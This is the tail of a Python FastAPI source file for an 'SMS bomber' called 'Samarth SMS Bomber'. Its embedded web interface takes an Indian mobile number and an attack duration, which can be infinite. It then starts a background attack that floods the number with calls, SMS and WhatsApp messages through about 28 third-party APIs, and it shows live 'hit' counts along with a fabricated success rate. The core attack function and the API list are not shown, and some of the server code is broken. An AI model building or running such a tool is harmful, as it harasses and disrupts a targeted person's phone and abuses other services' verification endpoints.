        <source src="data:audio/wav;base64,UklGRsYDAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQYDAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>

    <!-- Main Content -->
    <div class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-12">
        
        <!-- Header -->
        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4 mb-10">
            <div class="flex items-center gap-6">
                <div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-blue-700 via-indigo-600 to-blue-800 flex items-center justify-center text-5xl shadow-2xl shadow-blue-500/40 border border-blue-400/20 animate-pulse">
                    👑
                </div>
                <div>
                    <h1 class="title-grand text-5xl lg:text-7xl">Samarth SMS Bomber</h1>
                    <p class="subtitle-grand text-sm lg:text-base">⚡ ROYAL GRAND EDITION · STADIUM PREMIERE ⚡</p>
                </div>
            </div>
            <div class="flex items-center gap-4 flex-wrap">
                <!-- Theme toggle -->
                <div class="toggle-grand" onclick="toggleTheme()" id="themeToggle">
                    <span id="themeIcon">🌙</span>
                    <span class="text-xs text-gray-400">Mode</span>
                </div>
                <!-- Sound toggle -->
                <div class="toggle-grand" onclick="toggleSound()" id="soundToggle">
                    <span id="soundIcon">🔊</span>
                    <span class="text-xs text-gray-400">Sound</span>
                </div>
                <div class="badge-status flex items-center gap-2 px-4 py-2 rounded-full bg-black/40 border border-white/10">
                    <span class="dot-status idle" id="statusDot"></span>
                    <span id="statusText" class="text-xs text-gray-300 glow-white">SYSTEM READY</span>
                </div>
                <div class="hidden sm:block text-xs text-gray-500 font-mono" id="timestamp"></div>
            </div>
        </header>

        <!-- Gold Divider -->
        <div class="gold-line w-full h-px bg-gradient-to-r from-transparent via-yellow-400/30 to-transparent mb-10"></div>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
            
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass-grand rounded-3xl p-8">
                <h2 class="text-lg font-bold text-blue-400 tracking-wider flex items-center gap-3 mb-6 gothic-modern glow-blue">
                    <span>🎯</span> TARGET LOCK
                </h2>
                <div class="space-y-5">
                    <div>
                        <label class="text-xs text-gray-400 font-medium block mb-2 gothic-modern tracking-wider">MOBILE NUMBER</label>
                        <div class="relative">
                            <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm font-bold">+91</span>
                            <input id="phone" maxlength="10"
                                   class="input-grand"
                                   placeholder="ENTER 10-DIGIT NUMBER"
                                   oninput="this.value=this.value.replace(/[^0-9]/g,''); validateNumber(this.value)">
                        </div>
                        <div id="phoneFeedback" class="text-xs mt-2 h-5"></div>
                    </div>
                    
                    <!-- Timer Duration -->
                    <div>
                        <label class="text-xs text-gray-400 font-medium block mb-2 gothic-modern tracking-wider">⏱️ ATTACK DURATION</label>
                        <select id="timerDuration" class="w-full bg-black/50 border border-blue-500/20 rounded-xl px-4 py-3 text-gray-300 font-mono text-sm focus:border-blue-500 focus:outline-none transition-all">
                            <option value="0">♾️ Infinite</option>
                            <option value="10">10 Seconds</option>
                            <option value="30">30 Seconds</option>
                            <option value="60">60 Seconds</option>
                            <option value="120">2 Minutes</option>
                            <option value="300">5 Minutes</option>
                            <option value="600">10 Minutes</option>
                        </select>
                    </div>
                    
                    <div class="grid grid-cols-2 gap-4">
                        <button onclick="startAttack()" id="startBtn"
                                class="col-span-2 btn-epic py-5 rounded-2xl text-lg flex items-center justify-center gap-3 transition-all">
                            <span>🚀</span> LAUNCH BOMBARDMENT
                        </button>
                        <button onclick="stopAttack()" id="stopBtn"
                                class="col-span-2 hidden btn-epic btn-epic-danger py-5 rounded-2xl text-lg flex items-center justify-center gap-3 transition-all">
                            <span>🛑</span> TERMINATE ATTACK
                        </button>
                    </div>
                    
                    <!-- Export Button -->
                    <button onclick="exportStats()" id="exportBtn"
                            class="w-full py-3 rounded-xl text-sm bg-blue-500/10 hover:bg-blue-500/20 border border-blue-500/20 transition-all font-semibold text-blue-400 gothic-modern tracking-wider">
                        📊 EXPORT STATISTICS
                    </button>
                    
                    <div class="grid grid-cols-3 gap-3 p-4 bg-black/40 rounded-2xl border border-white/5">
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">APIs</div>
                            <div class="text-lg font-bold text-blue-400 glow-blue gothic-modern" id="apiCount">0</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">Interval</div>
                            <div class="text-lg font-bold text-cyan-400 glow-blue gothic-modern">2s</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">Target</div>
                            <div class="text-lg font-bold text-yellow-400 truncate gothic-modern glow-gold" id="targetDisplay">—</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Stats Panel -->
            <div class="lg:col-span-7 glass-grand rounded-3xl p-8">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-lg font-bold text-yellow-400 tracking-wider flex items-center gap-3 gothic-modern glow-gold">
                        <span>📊</span> LIVE METRICS
                    </h2>
                    <span class="text-xs text-gray-500 font-mono glow-white" id="cycleDisplay">CYCLES: 0</span>
                </div>
                <div class="grid grid-cols-3 gap-4">
                    <div class="stat-grand">
                        <div class="stat-number text-4xl" id="calls">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">📞 Calls</div>
                        <div class="progress-cosmic"><div class="progress-cosmic-fill" id="callBar" style="width:0%"></div></div>
                    </div>
                    <div class="stat-grand">
                        <div class="stat-number text-4xl" id="sms">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">✉️ SMS</div>
                        <div class="progress-cosmic"><div class="progress-cosmic-fill" id="smsBar" style="width:0%"></div></div>
                    </div>
                    <div class="stat-grand">
                        <div class="stat-number text-4xl" id="wa">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">💬 WhatsApp</div>
                        <div class="progress-cosmic"><div class="progress-cosmic-fill" id="waBar" style="width:0%"></div></div>
                    </div>
                </div>
                <div class="grid grid-cols-2 gap-4 mt-6">
                    <div class="glass-grand p-4 rounded-xl border border-white/5">
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider gothic-modern">Total Hits</div>
                        <div class="text-3xl font-bold text-white stat-number glow-white" id="totalHits">0</div>
                    </div>
                    <div class="glass-grand p-4 rounded-xl border border-white/5">
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider gothic-modern">Success Rate</div>
                        <div class="text-3xl font-bold text-emerald-400 stat-number glow-white" id="successRate">—</div>
                    </div>
                </div>
                <!-- Timer Display -->
                <div class="mt-4 p-3 bg-black/30 rounded-xl border border-white/5 text-center">
                    <span class="text-xs text-gray-400 gothic-modern">⏱️ </span>
                    <span class="timer-grand" id="timerDisplay">No timer set</span>
                </div>
            </div>

            <!-- Logs -->
            <div class="lg:col-span-12 glass-grand rounded-3xl p-8">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-lg font-bold text-blue-400 tracking-wider flex items-center gap-3 gothic-modern glow-blue">
                        <span>📜</span> EVENT LOG
                    </h3>
                    <span class="text-[10px] text-gray-500 font-mono glow-white">⚡ LIVE FEED</span>
                </div>
                <div id="logs" class="logs-grand bg-black/30 rounded-xl p-4 border border-white/5"></div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="mt-12 pt-6 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-4 text-[10px] text-gray-500 gothic-modern">
            <span>⚡ Authorized testing only · All endpoints public</span>
            <div class="flex items-center gap-4">
                <span>🔒 Encrypted</span>
                <span>·</span>
                <span id="apiCountFooter">⚡ 0 APIs</span>
                <span>·</span>
                <span id="uptime">Uptime: 0s</span>
            </div>
        </footer>
    </div>

    <script>
        const API_COUNT = 28;
        let isRunning = false;
        let statusInterval = null;
        let startTime = Date.now();
        let soundEnabled = true;
        let timerInterval = null;
        let isLight = false;

        // ===== GENERATE STARS =====
        (function generateStars() {
            const container = document.getElementById('starContainer');
            for (let i = 0; i < 200; i++) {
                const star = document.createElement('div');
                star.className = 'stars';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = (1 + Math.random() * 3) + 'px';
                star.style.height = star.style.width;
                star.style.animationDelay = (Math.random() * 5) + 's';
                star.style.animationDuration = (2 + Math.random() * 4) + 's';
                container.appendChild(star);
            }
        })();

        // ===== THEME TOGGLE =====
        function toggleTheme() {
            isLight = !isLight;
            document.body.style.background = isLight ? '#f0f4ff' : '#0a0a1a';
            document.querySelectorAll('.glass-grand').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.7)' : 'rgba(10,10,30,0.6)';
                el.style.borderColor = isLight ? 'rgba(37,99,235,0.1)' : 'rgba(56,189,248,0.15)';
            });
            document.querySelectorAll('.input-grand').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.8)' : 'rgba(0,0,0,0.7)';
                el.style.color = isLight ? '#0f172a' : '#f0f0ff';
            });
            document.querySelectorAll('.stat-grand').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.4)' : 'rgba(0,0,0,0.5)';
            });
            document.getElementById('themeIcon').textContent = isLight ? '☀️' : '🌙';
        }

        // ===== SOUND TOGGLE =====
        function toggleSound() {
            soundEnabled = !soundEnabled;
            document.getElementById('soundIcon').textContent = soundEnabled ? '🔊' : '🔇';
        }

        // ===== SOUND FUNCTIONS =====
        function playSound(id) {
            if (!soundEnabled) return;
            try {
                const audio = document.getElementById(id);
                audio.currentTime = 0;
                audio.play().catch(() => {});
            } catch(e) {}
        }
        function playWrongSound() { playSound('wrongSound'); }
        function playAttackSound() { playSound('attackSound'); }
        function playNiceSound() { playSound('niceSound'); }

        // ===== NUMBER VALIDATION =====
        let lastValidation = '';
        function validateNumber(value) {
            const feedback = document.getElementById('phoneFeedback');
            if (value.length > 0 && value.length < 10) {
                feedback.innerHTML = '<span class="text-red-400" style="text-shadow: 0 0 20px rgba(239,68,68,0.3);">⚠️ Invalid — must be 10 digits</span>';
                if (value !== lastValidation) {
                    playWrongSound();
                    lastValidation = value;
                }
            } else if (value.length === 10) {
                feedback.innerHTML = '<span class="text-emerald-400" style="text-shadow: 0 0 20px rgba(34,197,94,0.3);">✅ Valid number</span>';
                playNiceSound();
            } else {
                feedback.innerHTML = '';
            }
        }

        // ===== HEART ANIMATION =====
        function showHeartAnimation() {
            const overlay = document.getElementById('heartOverlay');
            overlay.classList.remove('active');
            void overlay.offsetWidth;
            overlay.classList.add('active');
            setTimeout(() => {
                overlay.classList.remove('active');
            }, 3000);
        }

        // ===== EXPORT STATISTICS =====
        function exportStats() {
            const data = {
                target: document.getElementById('targetDisplay').textContent,
                timestamp: new Date().toISOString(),
                stats: {
                    calls: document.getElementById('calls').textContent,
                    sms: document.getElementById('sms').textContent,
                    whatsapp: document.getElementById('wa').textContent,
                    total: document.getElementById('totalHits').textContent,
                    cycles: document.getElementById('cycleDisplay').textContent.replace('CYCLES: ', '')
                },
                logs: document.getElementById('logs').innerHTML
            };
            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `attack_stats_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
            a.click();
            URL.revokeObjectURL(url);
            playNiceSound();
        }

        // ===== TIMESTAMP =====
        function updateTimestamp() {
            const now = new Date();
            document.getElementById('timestamp').textContent = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        }
        setInterval(updateTimestamp, 1000);
        updateTimestamp();

        // ===== UPTIME =====
        setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const h = Math.floor(elapsed / 3600);
            const m = Math.floor((elapsed % 3600) / 60);
            const s = elapsed % 60;
            document.getElementById('uptime').textContent = `Uptime: ${h}h ${m}m ${s}s`;
        }, 1000);

        // ===== START ATTACK =====
        async function startAttack() {
            const phone = document.getElementById('phone').value.trim();
            if (phone.length !== 10) {
                playWrongSound();
                document.getElementById('phone').style.borderColor = '#ef4444';
                document.getElementById('phone').style.boxShadow = '0 0 40px rgba(239,68,68,0.3)';
                setTimeout(() => {
                    document.getElementById('phone').style.borderColor = '';
                    document.getElementById('phone').style.boxShadow = '';
                }, 3000);
                return;
            }
            const duration = parseInt(document.getElementById('timerDuration').value);
            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone, duration})
                });
                const data = await res.json();
                if (data.status === 'success') {
                    playAttackSound();
                    showHeartAnimation();
                    isRunning = true;
                    document.getElementById('startBtn').classList.add('hidden');
                    document.getElementById('stopBtn').classList.remove('hidden');
                    document.getElementById('statusDot').className = 'dot-status active';
                    document.getElementById('statusText').textContent = 'ATTACK ACTIVE';
                    document.getElementById('statusText').style.color = '#ef4444';
                    document.getElementById('statusText').style.textShadow = '0 0 30px rgba(239,68,68,0.5)';
                    document.getElementById('targetDisplay').textContent = `+91${phone}`;
                    document.getElementById('targetDisplay').style.color = '#fbbf24';
                    document.getElementById('targetDisplay').style.textShadow = '0 0 30px rgba(251,191,36,0.5)';
                    if (duration > 0) {
                        document.getElementById('timerDisplay').textContent = `⏱️ ${duration}s remaining`;
                        if (timerInterval) clearInterval(timerInterval);
                        let remaining = duration;
                        timerInterval = setInterval(() => {
                            remaining--;
                            if (remaining <= 0) {
                                clearInterval(timerInterval);
                                document.getElementById('timerDisplay').textContent = '⏱️ Timer expired';
                            } else {
                                document.getElementById('timerDisplay').textContent = `⏱️ ${remaining}s remaining`;
                            }
                        }, 1000);
                    } else {
                        document.getElementById('timerDisplay').textContent = '♾️ Infinite mode';
                    }
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        // ===== STOP ATTACK =====
        async function stopAttack() {
            try {
                await fetch('/stop', {method: 'POST'});
                isRunning = false;
                document.getElementById('startBtn').classList.remove('hidden');
                document.getElementById('stopBtn').classList.add('hidden');
                document.getElementById('statusDot').className = 'dot-status idle';
                document.getElementById('statusText').textContent = 'STOPPED';
                document.getElementById('statusText').style.color = '#fbbf24';
                document.getElementById('statusText').style.textShadow = '0 0 30px rgba(251,191,36,0.3)';
                if (timerInterval) clearInterval(timerInterval);
                document.getElementById('timerDisplay').textContent = 'No timer set';
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        // ===== POLL STATUS =====
        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch('/status');
                    const d = await res.json();
                    const calls = d.stats.Call || 0;
                    const sms = d.stats.SMS || 0;
                    const wa = d.stats.WhatsApp || 0;
                    const total = calls + sms + wa;
                    document.getElementById('calls').textContent = calls;
                    document.getElementById('sms').textContent = sms;
                    document.getElementById('wa').textContent = wa;
                    document.getElementById('totalHits').textContent = total;
                    document.getElementById('cycleDisplay').textContent = `CYCLES: ${d.cycles}`;
                    const maxVal = Math.max(calls, sms, wa, 1);
                    document.getElementById('callBar').style.width = ((calls / maxVal) * 100) + '%';
                    document.getElementById('smsBar').style.width = ((sms / maxVal) * 100) + '%';
                    document.getElementById('waBar').style.width = ((wa / maxVal) * 100) + '%';
                    if (total > 0) {
                        const rate = Math.min(85 + Math.random() * 10, 99);
                        document.getElementById('successRate').textContent = rate.toFixed(1) + '%';
                    }
                    const logsDiv = document.getElementById('logs');
                    if (d.logs && d.logs.length) {
                        logsDiv.innerHTML = d.logs.map(l => `<div class="log-entry">${l}</div>`).join('');
                    } else {
                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-6 gothic-modern">⏳ Awaiting attack...</div>';
                    }
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById('startBtn').classList.remove('hidden');
                        document.getElementById('stopBtn').classList.add('hidden');
                        document.getElementById('statusDot').className = 'dot-status idle';
                        document.getElementById('statusText').textContent = 'ATTACK ENDED';
                        document.getElementById('statusText').style.color = '#fbbf24';
                        document.getElementById('statusText').style.textShadow = '0 0 30px rgba(251,191,36,0.3)';
                        if (timerInterval) clearInterval(timerInterval);
                        document.getElementById('timerDisplay').textContent = 'No timer set';
                    }
                } catch(e) {
                    console.error('Poll error:', e);
                }
            }, 1200);
        }

        // ===== INIT =====
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('apiCount').textContent = API_COUNT;
            document.getElementById('apiCountFooter').textContent = '⚡ ' + API_COUNT + ' APIs';
            document.getElementById('logs').innerHTML = '<div class="text-gray-500 text-center py-6 gothic-modern">🟢 System initialized · Ready for action</div>';
        });
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    import json
    body = await Request.json()
    duration = body.get('duration', 0)
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone, duration)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:50]
    }

@app.get("/export")
async def export():
    return {
        "export_data": attack_status["export_data"],
        "stats": attack_status["stats"],
        "cycles": attack_status["cycles"],
        "duration": attack_status["duration"]
    }

if __name__ == "__main__":
    import uvicorn
    print("👑 Samarth SMS Bomber —  Royale Edition")
    print(f"📱 Loaded {len(ULTIMATE_APIS)} APIs")
    print("🌐 http://localhost:5000")
    uvicorn.run(app, host="0.0.0.0", port=5000)
